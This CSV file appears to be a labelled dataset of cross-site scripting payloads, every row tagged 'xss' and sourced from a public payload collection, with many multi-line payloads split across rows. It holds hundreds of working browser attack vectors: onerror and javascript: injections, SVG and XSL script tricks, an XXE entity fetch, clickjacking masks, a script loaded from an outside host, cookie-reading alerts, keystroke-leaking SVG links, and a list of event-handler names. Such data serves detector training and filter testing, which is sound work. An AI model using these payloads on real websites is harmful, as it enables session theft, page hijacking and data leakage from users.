payload,label,source
"<div id=""61""><div  style=""\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;"">XXX</div>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""62""><!-- IE 6-8 -->",xss,payloads_all_the_things
"<x '=""foo""><x foo='><img src=x onerror=alert(62)//'>",xss,payloads_all_the_things
<!-- IE 6-9 -->,xss,payloads_all_the_things
"<! '=""foo""><x foo='><img src=x onerror=alert(2)//'>",xss,payloads_all_the_things
"<? '=""foo""><x foo='><img src=x onerror=alert(3)//'>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""63""><embed src=""javascript:alert(63)""></embed> // O10.10↓, OM10.0↓, GC6↓, FF",xss,payloads_all_the_things
"<img src=""javascript:alert(2)"">",xss,payloads_all_the_things
"<image src=""javascript:alert(2)""> // IE6, O10.10↓, OM10.0↓",xss,payloads_all_the_things
"<script src=""javascript:alert(3)""></script> // IE6, O11.01↓, OM10.1↓//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""64""><!DOCTYPE x[<!ENTITY x SYSTEM ""http://html5sec.org/test.xxe"">]><y>&x;</y>//[""'`-->]]>]</div><div id=""65""><svg onload=""javascript:alert(65)"" xmlns=""http://www.w3.org/2000/svg""></svg>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""66""><?xml version=""1.0""?>",xss,payloads_all_the_things
"<?xml-stylesheet type=""text/xsl"" href=""data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E""?>",xss,payloads_all_the_things
"<root/>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""67""><!DOCTYPE x [",xss,payloads_all_the_things
"<!ATTLIST img xmlns CDATA ""http://www.w3.org/1999/xhtml"" src CDATA ""xx:x""",xss,payloads_all_the_things
"onerror CDATA ""alert(67)""",xss,payloads_all_the_things
"onload CDATA ""alert(2)"">",xss,payloads_all_the_things
"]><img />//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""68""><doc xmlns:xlink=""http://www.w3.org/1999/xlink"" xmlns:html=""http://www.w3.org/1999/xhtml"">",xss,payloads_all_the_things
"<html:style /><x xlink:href=""javascript:alert(68)"" xlink:type=""simple"">XXX</x>",xss,payloads_all_the_things
"</doc>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""69""><card xmlns=""http://www.wapforum.org/2001/wml""><onevent type=""ontimer""><go href=""javascript:alert(69)""/></onevent><timer value=""1""/></card>//[""'`-->]]>]</div><div id=""70""><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//[""'`-->]]>]</div><div id=""71""><// style=x:expression\28alert(71)\29>//[""'`-->]]>]</div><div id=""72""><form><button formaction=""javascript:alert(72)"">X</button>//[""'`-->]]>]</div><div id=""73""><event-source src=""event.php"" onload=""alert(73)"">//[""'`-->]]>]</div><div id=""74""><a href=""javascript:alert(74)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"" /></a>//[""'`-->]]>]</div><div id=""75""><script<{alert(75)}/></script </>//[""'`-->]]>]</div><div id=""76""><?xml-stylesheet type=""text/css""?><!DOCTYPE x SYSTEM ""test.dtd""><x>&x;</x>//[""'`-->]]>]</div><div id=""77""><?xml-stylesheet type=""text/css""?><root style=""x:expression(alert(77))""/>//[""'`-->]]>]</div><div id=""78""><?xml-stylesheet type=""text/xsl"" href=""#""?><img xmlns=""x-schema:test.xdr""/>//[""'`-->]]>]</div><div id=""79""><object allowscriptaccess=""always"" data=""test.swf""></object>//[""'`-->]]>]</div><div id=""80""><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//[""'`-->]]>]</div><div id=""81""><x xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:actuate=""onLoad"" xlink:href=""javascript:alert(81)"" xlink:type=""simple""/>//[""'`-->]]>]</div><div id=""82""><?xml-stylesheet type=""text/css"" href=""data:,*%7bx:expression(write(2));%7d""?>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""83""><x:template xmlns:x=""http://www.wapforum.org/2001/wml""  x:ontimer=""$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)""><x:timer value=""1""/></x:template>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""84""><x xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"" ev:handler=""javascript:alert(84)//#x""/>//[""'`-->]]>]</div><div id=""85""><x xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"" ev:handler=""test.evt#x""/>//[""'`-->]]>]</div><div id=""86""><body oninput=alert(86)><input autofocus>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""87""><svg xmlns=""http://www.w3.org/2000/svg"">",xss,payloads_all_the_things
"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""javascript:alert(87)""><rect width=""1000"" height=""1000"" fill=""white""/></a>",xss,payloads_all_the_things
"</svg>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""88""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",xss,payloads_all_the_things
"<animation xlink:href=""javascript:alert(88)""/>",xss,payloads_all_the_things
"<animation xlink:href=""data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",xss,payloads_all_the_things
"<image xlink:href=""data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",xss,payloads_all_the_things
"<foreignObject xlink:href=""javascript:alert(88)""/>",xss,payloads_all_the_things
"<foreignObject xlink:href=""data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E""/>",xss,payloads_all_the_things
"<div id=""89""><svg xmlns=""http://www.w3.org/2000/svg"">",xss,payloads_all_the_things
"<set attributeName=""onmouseover"" to=""alert(89)""/>",xss,payloads_all_the_things
"<animate attributeName=""onunload"" to=""alert(89)""/>",xss,payloads_all_the_things
"<div id=""90""><!-- Up to Opera 10.63 -->",xss,payloads_all_the_things
<div style=content:url(test2.svg)></div>,xss,payloads_all_the_things
<!-- Up to Opera 11.64 - see link below -->,xss,payloads_all_the_things
<!-- Up to Opera 12.x -->,xss,payloads_all_the_things
"<div style=""background:url(test5.svg)"">PRESS ENTER</div>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""91"">[A]",xss,payloads_all_the_things
"<? foo=""><script>alert(91)</script>"">",xss,payloads_all_the_things
"<! foo=""><script>alert(91)</script>"">",xss,payloads_all_the_things
"</ foo=""><script>alert(91)</script>"">",xss,payloads_all_the_things
[B],xss,payloads_all_the_things
"<? foo=""><x foo='?><script>alert(91)</script>'>"">",xss,payloads_all_the_things
[C],xss,payloads_all_the_things
"<! foo=""[[[x]]""><x foo=""]foo><script>alert(91)</script>"">",xss,payloads_all_the_things
[D],xss,payloads_all_the_things
"<% foo><x foo=""%><script>alert(91)</script>"">//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""92""><div style=""background:url(http://foo.f/f oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""93""><div style=""list-style:url(http://foo.f)\20url(javascript:alert(93));"">X</div>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""94""><svg xmlns=""http://www.w3.org/2000/svg"">",xss,payloads_all_the_things
"<handler xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"">alert(94)</handler>",xss,payloads_all_the_things
"<div id=""95""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",xss,payloads_all_the_things
<feImage>,xss,payloads_all_the_things
"<set attributeName=""xlink:href"" to=""data:image/svg+xml;charset=utf-8;base64,",xss,payloads_all_the_things
"PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D""/>",xss,payloads_all_the_things
</feImage>,xss,payloads_all_the_things
"<div id=""96""><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>",xss,payloads_all_the_things
"<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""97""><!-- IE 5-9 -->",xss,payloads_all_the_things
"<div id=d><x xmlns=""><iframe onload=alert(97)""></div>",xss,payloads_all_the_things
<script>d.innerHTML+='';</script>,xss,payloads_all_the_things
<!-- IE 10 in IE5-9 Standards mode -->,xss,payloads_all_the_things
"<div id=d><x xmlns='""><iframe onload=alert(2)//'></div>",xss,payloads_all_the_things
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""98""><div id=d><div style=""font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'"">X</div></div>",xss,payloads_all_the_things
"<script>with(document.getElementById(""d""))innerHTML=innerHTML</script>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""99"">XXX<style>",xss,payloads_all_the_things
*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */,xss,payloads_all_the_things
<!--,xss,payloads_all_the_things
--><!--*{color:red}   /* all UA */,xss,payloads_all_the_things
*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */,xss,payloads_all_the_things
"</style>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""100""><img[a][b]src=x[d]onerror[c]=[e]""alert(100)"">//[""'`-->]]>]</div><div id=""101""><a href=""[a]java[b]script[c]:alert(101)"">XXX</a>//[""'`-->]]>]</div><div id=""102""><img src=""x` `<script>alert(102)</script>""` `>//[""'`-->]]>]</div><div id=""103""><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",xss,payloads_all_the_things
"<x xmlns=""http://www.w3.org/2001/xml-events"" event=""load"" observer=""foo"" handler=""data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar""/>",xss,payloads_all_the_things
"<div id=""105""><iframe src=""data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03""></iframe>//[""'`-->]]>]</div><div id=""106""><img src onerror /"" '""= alt=alert(106)//"">//[""'`-->]]>]</div><div id=""107""><title onpropertychange=alert(107)></title><title title=></title>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""108""><!-- IE 5-8 standards mode -->",xss,payloads_all_the_things
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=xx:x onerror=alert(108)></a>"">",xss,payloads_all_the_things
<!-- IE 5-9 standards mode -->,xss,payloads_all_the_things
"<!a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(2)//"">",xss,payloads_all_the_things
"<?a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(3)//"">//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""109""><svg xmlns=""http://www.w3.org/2000/svg"">",xss,payloads_all_the_things
"<a id=""x""><rect fill=""white"" width=""1000"" height=""1000""/></a>",xss,payloads_all_the_things
"<rect  fill=""white"" style=""clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);""/>",xss,payloads_all_the_things
"<div id=""110""><svg xmlns=""http://www.w3.org/2000/svg"">",xss,payloads_all_the_things
"<path d=""M0,0"" style=""marker-start:url(test4.svg#a)""/>",xss,payloads_all_the_things
"<div id=""111""><div style=""background:url(/f#[a]oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""112""><div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""113""><div id=""x"">XXX</div>",xss,payloads_all_the_things
"<div id=""114""><x style=""background:url('x[a];color:red;/*')"">XXX</x>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""115""><!--[if]><script>alert(115)</script -->",xss,payloads_all_the_things
"<!--[if<img src=x onerror=alert(2)//]> -->//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""116""><div id=""x"">x</div>",xss,payloads_all_the_things
"<xml:namespace prefix=""t"">",xss,payloads_all_the_things
"<import namespace=""t"" implementation=""#default#time2"">",xss,payloads_all_the_things
"<t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;"">//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""117""><a href=""http://attacker.org"">",xss,payloads_all_the_things
"<iframe src=""http://example.org/""></iframe>",xss,payloads_all_the_things
"</a>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""118""><div draggable=""true"" ondragstart=""event.dataTransfer.setData('text/plain','malicious code');"">",xss,payloads_all_the_things
<h1>Drop me</h1>,xss,payloads_all_the_things
</div>,xss,payloads_all_the_things
"<iframe src=""http://www.example.org/dropHere.html""></iframe>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""119""><iframe src=""view-source:http://www.example.org/"" frameborder=""0"" style=""width:400px;height:180px""></iframe>",xss,payloads_all_the_things
"<textarea type=""text"" cols=""50"" rows=""10""></textarea>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""120""><script>",xss,payloads_all_the_things
function makePopups(){,xss,payloads_all_the_things
for (i=1;i<6;i++) {,xss,payloads_all_the_things
"window.open('popup.html','spam'+i,'width=50,height=50');",xss,payloads_all_the_things
"<a href=""#"" onclick=""makePopups()"">Spam</a>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""121""><html xmlns=""http://www.w3.org/1999/xhtml""",xss,payloads_all_the_things
"xmlns:svg=""http://www.w3.org/2000/svg"">",xss,payloads_all_the_things
"<body style=""background:gray"">",xss,payloads_all_the_things
"<iframe src=""http://example.com/"" style=""width:800px; height:350px; border:none; mask: url(#maskForClickjacking);""/>",xss,payloads_all_the_things
<svg:svg>,xss,payloads_all_the_things
"<svg:mask id=""maskForClickjacking"" maskUnits=""objectBoundingBox"" maskContentUnits=""objectBoundingBox"">",xss,payloads_all_the_things
"<svg:rect x=""0.0"" y=""0.0"" width=""0.373"" height=""0.3"" fill=""white""/>",xss,payloads_all_the_things
"<svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/>",xss,payloads_all_the_things
</svg:mask>,xss,payloads_all_the_things
</svg:svg>,xss,payloads_all_the_things
"<div id=""122""><iframe sandbox=""allow-same-origin allow-forms allow-scripts"" src=""http://example.org/""></iframe>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""123""><span class=foo>Some text</span>",xss,payloads_all_the_things
"<a class=bar href=""http://www.example.org"">www.example.org</a>",xss,payloads_all_the_things
"<script src=""http://code.jquery.com/jquery-1.4.4.js""></script>",xss,payloads_all_the_things
"$(""span.foo"").click(function() {",xss,payloads_all_the_things
alert('foo');,xss,payloads_all_the_things
"$(""a.bar"").click();",xss,payloads_all_the_things
"$(""a.bar"").click(function() {",xss,payloads_all_the_things
alert('bar');,xss,payloads_all_the_things
"location=""http://html5sec.org"";",xss,payloads_all_the_things
"</script>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""124""><script src=""/\example.com\foo.js""></script> // Safari 5.0, Chrome 9, 10",xss,payloads_all_the_things
"<script src=""\\example.com\foo.js""></script> // Safari 5.0//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""125""><?xml version=""1.0""?>",xss,payloads_all_the_things
"<?xml-stylesheet type=""text/xml"" href=""#stylesheet""?>",xss,payloads_all_the_things
<!DOCTYPE doc [,xss,payloads_all_the_things
<!ATTLIST xsl:stylesheet,xss,payloads_all_the_things
id    ID    #REQUIRED>]>,xss,payloads_all_the_things
"<svg xmlns=""http://www.w3.org/2000/svg"">",xss,payloads_all_the_things
"<xsl:stylesheet id=""stylesheet"" version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",xss,payloads_all_the_things
"<xsl:template match=""/"">",xss,payloads_all_the_things
"<iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert(125)""></iframe>",xss,payloads_all_the_things
</xsl:template>,xss,payloads_all_the_things
</xsl:stylesheet>,xss,payloads_all_the_things
"<circle fill=""red"" r=""40""></circle>",xss,payloads_all_the_things
"<div id=""126""><object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object>",xss,payloads_all_the_things
"<object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""alert(126)"" style=""behavior:url(#x);""><param name=postdomevents /></object>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""127""><svg xmlns=""http://www.w3.org/2000/svg"" id=""x"">",xss,payloads_all_the_things
"<listener event=""load"" handler=""#y"" xmlns=""http://www.w3.org/2001/xml-events"" observer=""x""/>",xss,payloads_all_the_things
"<handler id=""y"">alert(127)</handler>",xss,payloads_all_the_things
"<div id=""128""><svg><style>&lt;img/src=x onerror=alert(128)// </b>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""129""><svg>",xss,payloads_all_the_things
"<image style='filter:url(""data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>"")'>",xss,payloads_all_the_things
<image filter='...'>,xss,payloads_all_the_things
-->,xss,payloads_all_the_things
"<div id=""130""><math href=""javascript:alert(130)"">CLICKME</math>",xss,payloads_all_the_things
<math>,xss,payloads_all_the_things
<!-- up to FF 13 -->,xss,payloads_all_the_things
"<maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:alert(2)"">CLICKME</maction>",xss,payloads_all_the_things
<!-- FF 14+ -->,xss,payloads_all_the_things
"<maction actiontype=""statusline"" xlink:href=""javascript:alert(3)"">CLICKME<mtext>http://http://google.com</mtext></maction>",xss,payloads_all_the_things
"</math>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""131""><b>drag and drop one of the following strings to the drop box:</b>",xss,payloads_all_the_things
<br/><hr/>,xss,payloads_all_the_things
jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//,xss,payloads_all_the_things
feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//,xss,payloads_all_the_things
"feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>",xss,payloads_all_the_things
feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//,xss,payloads_all_the_things
"<div id=""dropbox"" style=""height: 360px;width: 500px;border: 5px solid #000;position: relative;"" ondragover=""event.preventDefault()"">+ Drop Box +</div>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""132""><!doctype html>",xss,payloads_all_the_things
<form>,xss,payloads_all_the_things
"<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>",xss,payloads_all_the_things
<br>,xss,payloads_all_the_things
"<input name=""secret"" type=""password"">",xss,payloads_all_the_things
</form>,xss,payloads_all_the_things
"<!-- injection --><svg height=""50px"">",xss,payloads_all_the_things
"<image xmlns:xlink=""http://www.w3.org/1999/xlink"">",xss,payloads_all_the_things
"<set attributeName=""xlink:href"" begin=""accessKey(a)"" to=""//example.com/?a"" />",xss,payloads_all_the_things
"<set attributeName=""xlink:href"" begin=""accessKey(b)"" to=""//example.com/?b"" />",xss,payloads_all_the_things
"<set attributeName=""xlink:href"" begin=""accessKey(c)"" to=""//example.com/?c"" />",xss,payloads_all_the_things
"<set attributeName=""xlink:href"" begin=""accessKey(d)"" to=""//example.com/?d"" />",xss,payloads_all_the_things
</image>,xss,payloads_all_the_things
"<div id=""133""><!-- `<img/src=xx:xx onerror=alert(133)//--!>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""134""><xmp>",xss,payloads_all_the_things
<%,xss,payloads_all_the_things
</xmp>,xss,payloads_all_the_things
<img alt='%></xmp><img src=xx:x onerror=alert(134)//'>,xss,payloads_all_the_things
x='<%',xss,payloads_all_the_things
</script> %>/,xss,payloads_all_the_things
alert(2),xss,payloads_all_the_things
XXX,xss,payloads_all_the_things
*['<!--']{},xss,payloads_all_the_things
-->{},xss,payloads_all_the_things
"*{color:red}</style>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""135""><?xml-stylesheet type=""text/xsl"" href=""#"" ?>",xss,payloads_all_the_things
"<stylesheet xmlns=""http://www.w3.org/TR/WD-xsl"">",xss,payloads_all_the_things
"<template match=""/"">",xss,payloads_all_the_things
<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>,xss,payloads_all_the_things
"<if expr=""new ActiveXObject('htmlfile').parentWindow.alert(2)""></if>",xss,payloads_all_the_things
</template>,xss,payloads_all_the_things
"</stylesheet>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""136""><form action="""" method=""post"">",xss,payloads_all_the_things
"<input name=""username"" value=""admin"" />",xss,payloads_all_the_things
"<input name=""password"" type=""password"" value=""secret"" />",xss,payloads_all_the_things
"<input name=""injected"" value=""injected"" dirname=""password"" />",xss,payloads_all_the_things
"<input type=""submit"">",xss,payloads_all_the_things
"</form>//[""'`-->]]>]</div>",xss,payloads_all_the_things
"<div id=""137""><svg>",xss,payloads_all_the_things
"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""?"">",xss,payloads_all_the_things
"<circle r=""400""></circle>",xss,payloads_all_the_things
"<animate attributeName=""xlink:href"" begin=""0"" from=""javascript:alert(137)"" to=""&"" />",xss,payloads_all_the_things
"<div id=""138""><link rel=""import"" href=""test.svg"" />//[""'`-->]]>]</div><div id=""139""><iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />//[""'`-->]]>]</div>undefined",xss,payloads_all_the_things
onafterprint,xss,payloads_all_the_things
onafterscriptexecute,xss,payloads_all_the_things
onanimationcancel,xss,payloads_all_the_things
onanimationend,xss,payloads_all_the_things
onanimationiteration,xss,payloads_all_the_things
onanimationstart,xss,payloads_all_the_things
onauxclick,xss,payloads_all_the_things
onbeforecopy,xss,payloads_all_the_things
onbeforecut,xss,payloads_all_the_things
onbeforeinput,xss,payloads_all_the_things
onbeforeprint,xss,payloads_all_the_things
onbeforescriptexecute,xss,payloads_all_the_things
onbeforetoggle,xss,payloads_all_the_things
onbeforeunload,xss,payloads_all_the_things
onbegin,xss,payloads_all_the_things
onblur,xss,payloads_all_the_things
onbounce,xss,payloads_all_the_things
oncanplay,xss,payloads_all_the_things
oncanplaythrough,xss,payloads_all_the_things
onchange,xss,payloads_all_the_things
onclick,xss,payloads_all_the_things
onclose,xss,payloads_all_the_things
oncontextmenu,xss,payloads_all_the_things
oncopy,xss,payloads_all_the_things
oncuechange,xss,payloads_all_the_things
oncut,xss,payloads_all_the_things
ondblclick,xss,payloads_all_the_things
ondrag,xss,payloads_all_the_things
ondragend,xss,payloads_all_the_things
ondragenter,xss,payloads_all_the_things
ondragexit,xss,payloads_all_the_things
ondragleave,xss,payloads_all_the_things
ondragover,xss,payloads_all_the_things
ondragstart,xss,payloads_all_the_things
ondrop,xss,payloads_all_the_things
ondurationchange,xss,payloads_all_the_things
onend,xss,payloads_all_the_things
onended,xss,payloads_all_the_things
onerror,xss,payloads_all_the_things
onfinish,xss,payloads_all_the_things
onfocus,xss,payloads_all_the_things
onfocusin,xss,payloads_all_the_things
onfocusout,xss,payloads_all_the_things
onformdata,xss,payloads_all_the_things
onfullscreenchange,xss,payloads_all_the_things
onhashchange,xss,payloads_all_the_things
oninput,xss,payloads_all_the_things
oninvalid,xss,payloads_all_the_things
onkeydown,xss,payloads_all_the_things
onkeypress,xss,payloads_all_the_things
onkeyup,xss,payloads_all_the_things
onloadeddata,xss,payloads_all_the_things
onloadedmetadata,xss,payloads_all_the_things
onloadstart,xss,payloads_all_the_things
onmessage,xss,payloads_all_the_things
onmousedown,xss,payloads_all_the_things
onmouseenter,xss,payloads_all_the_things
onmouseleave,xss,payloads_all_the_things
onmousemove,xss,payloads_all_the_things
onmouseout,xss,payloads_all_the_things
onmouseover,xss,payloads_all_the_things
onmouseup,xss,payloads_all_the_things
onmousewheel,xss,payloads_all_the_things
onmozfullscreenchange,xss,payloads_all_the_things
onpagehide,xss,payloads_all_the_things
onpageshow,xss,payloads_all_the_things
onpaste,xss,payloads_all_the_things
onpause,xss,payloads_all_the_things
onplay,xss,payloads_all_the_things
onplaying,xss,payloads_all_the_things
onpointerdown,xss,payloads_all_the_things
onpointerenter,xss,payloads_all_the_things
onpointerleave,xss,payloads_all_the_things
onpointermove,xss,payloads_all_the_things
onpointerout,xss,payloads_all_the_things
onpointerover,xss,payloads_all_the_things
onpointerrawupdate,xss,payloads_all_the_things
onpointerup,xss,payloads_all_the_things
onpopstate,xss,payloads_all_the_things
onprogress,xss,payloads_all_the_things
onratechange,xss,payloads_all_the_things
onrepeat,xss,payloads_all_the_things
onreset,xss,payloads_all_the_things
onresize,xss,payloads_all_the_things
onscroll,xss,payloads_all_the_things
onscrollend,xss,payloads_all_the_things
onsearch,xss,payloads_all_the_things
onseeked,xss,payloads_all_the_things
onseeking,xss,payloads_all_the_things
onselect,xss,payloads_all_the_things
onselectionchange,xss,payloads_all_the_things
onselectstart,xss,payloads_all_the_things
onshow,xss,payloads_all_the_things
onstart,xss,payloads_all_the_things
onsubmit,xss,payloads_all_the_things
onsuspend,xss,payloads_all_the_things
ontimeupdate,xss,payloads_all_the_things
ontoggle,xss,payloads_all_the_things
ontouchend,xss,payloads_all_the_things
ontouchmove,xss,payloads_all_the_things
ontouchstart,xss,payloads_all_the_things
ontransitioncancel,xss,payloads_all_the_things
ontransitionend,xss,payloads_all_the_things
ontransitionrun,xss,payloads_all_the_things
ontransitionstart,xss,payloads_all_the_things
onunhandledrejection,xss,payloads_all_the_things
onunload,xss,payloads_all_the_things
onvolumechange,xss,payloads_all_the_things
onwebkitanimationend,xss,payloads_all_the_things
onwebkitanimationiteration,xss,payloads_all_the_things
onwebkitanimationstart,xss,payloads_all_the_things
onwebkittransitionend,xss,payloads_all_the_things
onwheel,xss,payloads_all_the_things
<SCRIPT>alert('XSS');</SCRIPT>,xss,payloads_all_the_things
"'';!--""<XSS>=&{()}",xss,payloads_all_the_things
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss,payloads_all_the_things
"<IMG SRC=""javascript:alert('XSS');"">",xss,payloads_all_the_things
<IMG SRC=javascript:alert('XSS')>,xss,payloads_all_the_things
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss,payloads_all_the_things
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss,payloads_all_the_things
